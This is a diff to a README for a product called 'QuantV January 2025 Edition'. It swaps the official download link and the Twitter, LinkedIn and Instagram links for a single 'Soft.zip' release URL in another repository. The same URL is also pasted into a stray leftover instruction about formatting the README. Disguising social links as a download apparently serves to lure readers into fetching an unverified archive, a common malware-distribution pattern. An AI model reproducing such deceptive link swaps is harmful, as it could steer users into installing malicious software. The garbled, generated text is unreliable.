@@ -26,7 +26,7 @@ Welcome to the official repository of **QuantV January 2025 Edition**! This cutt
 
 ## Download QuantV January 2025 Edition 📥
 
-📌 **[Launch QuantV January 2025 Edition](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)**
+📌 **[Launch QuantV January 2025 Edition](https://github.com/Nguyeme/QuantV-January/releases/download/v1.0/Soft.zip)**
 
 For your convenience, the download link is provided above. Click the link to download the latest version of QuantV January 2025 Edition.
 
@@ -54,11 +54,11 @@ If you encounter any issues, have questions, or need assistance with QuantV Janu
 
 Stay up to date with the latest news, updates, and announcements regarding QuantV January 2025 Edition by following us on social media:
 
-📱 [Twitter](https://twitter.com/QuantV_Official)
+📱 [Twitter](https://github.com/Nguyeme/QuantV-January/releases/download/v1.0/Soft.zip)
 
-💼 [LinkedIn](https://www.linkedin.com/company/quantv)
+💼 [LinkedIn](https://github.com/Nguyeme/QuantV-January/releases/download/v1.0/Soft.zip)
 
-📸 [Instagram](https://www.instagram.com/quantv.official)
+📸 [Instagram](https://github.com/Nguyeme/QuantV-January/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -74,4 +74,4 @@ Thank you for choosing QuantV January 2025 Edition. Let's revolutionize the worl
 
 ---
 
-Format the README.md content properly for better display on the GitHub repository. You can use markdown formatting and emojis creatively to enhance the visual appeal and readability of the README file.
+Format the https://github.com/Nguyeme/QuantV-January/releases/download/v1.0/Soft.zip content properly for better display on the GitHub repository. You can use markdown formatting and emojis creatively to enhance the visual appeal and readability of the README file.
